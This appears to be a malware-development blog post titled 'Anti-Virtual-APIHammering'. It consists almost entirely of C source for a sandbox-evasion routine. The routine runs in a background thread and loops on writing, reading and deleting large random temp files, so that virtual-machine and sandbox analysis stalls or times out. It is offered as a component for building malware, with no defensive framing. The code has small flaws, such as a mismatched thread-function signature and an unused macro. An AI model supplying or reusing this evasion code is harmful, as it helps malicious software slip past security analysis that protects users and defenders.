---
title: "Anti-Virtual-APIHammering"
date: 2026-06-19 00:00:00 +0100
categories: [Malware, Development]
tags:
  - malware
  - development
---

# Anti-Virtual-APIHammering


## api-hammering.c

```c
#include <Windows.h>
#include <stdio.h>

#define TMP L"N0xShell.tmp"
#define STRESSFACTOR(i) ((int)(i) * 196)

#define ERR(WinAPI) printf("[!] %s Failed With Error : %d \n", WinAPI, GetLastError())

BOOL APIHammering(_In_ DWORD dwStress) {

	WCHAR	wcPath[MAX_PATH * 2], wcTmpPath[MAX_PATH];
	HANDLE	hRfile = INVALID_HANDLE_VALUE;
	HANDLE	hWFile = NTE_INVALID_HANDLE;
	DWORD	dwNumBytesRead = 0;
	DWORD	dwNumBytesWritten = 0;
	PBYTE	pRandBuffer = NULL;
	SIZE_T	sBufferSize = 0xFFFFF;
	INT		Rand = 0;


	// Getting the fqdn tmp file path
	if (!GetTempPathW(MAX_PATH, wcTmpPath)) {
		ERR("GetTempPathW");
		return FALSE;
	}

	// Construct fqdn for tmp file name
	wsprintfW(wcPath, L"%s%s", wcTmpPath, TMP);

	for (SIZE_T i = 0; i < dwStress; i++) {

		// Create file in write mode
		if ((hWFile = CreateFileW(wcPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL)) == INVALID_HANDLE_VALUE) {
			ERR("CreateFileW");
			return FALSE;
		}

		// Allocate memory on the heap and fill it with random stuff
		pRandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
		Rand = rand() % 0xFF;
		memset(pRandBuffer, Rand, sBufferSize);

		// Write random stuff into the temporate created file
		if (!WriteFile(hWFile, pRandBuffer, sBufferSize, &dwNumBytesWritten, NULL) || dwNumBytesWritten != sBufferSize) {
			ERR("WriteFile");
			return FALSE;
		}

		// Cleaning up the Heap
		RtlZeroMemory(pRandBuffer, sBufferSize);
		CloseHandle(hWFile);

		// Open tmp file with read & delete mode when closed
		if ((hRfile = CreateFileW(wcPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
			ERR("CreateFileW");
			return FALSE;
		}

		// Read tmp file
		if (!ReadFile(hRfile, pRandBuffer, sBufferSize, &dwNumBytesRead, NULL) || dwNumBytesRead != sBufferSize) {
			ERR("ReadFile");
			return FALSE;
		}

		// Cleaning up
		RtlZeroMemory(pRandBuffer, sBufferSize);
		HeapFree(GetProcessHeap(), NULL, pRandBuffer);
		CloseHandle(hRfile);
	}
	
	return TRUE;
}


int main(void) {
	
	DWORD dwThreadID = 0;

	if (!CreateThread(NULL, NULL, APIHammering, -1, NULL, &dwThreadID)) {
		ERR("CreateThread");
		return -1;
	}

	printf("[+] Thread %d Created To Run APiHanmering in Background! \n", dwThreadID);

	printf("[+] Press <Enter> To Exit \n");
	getchar();

	return 0;
}
```

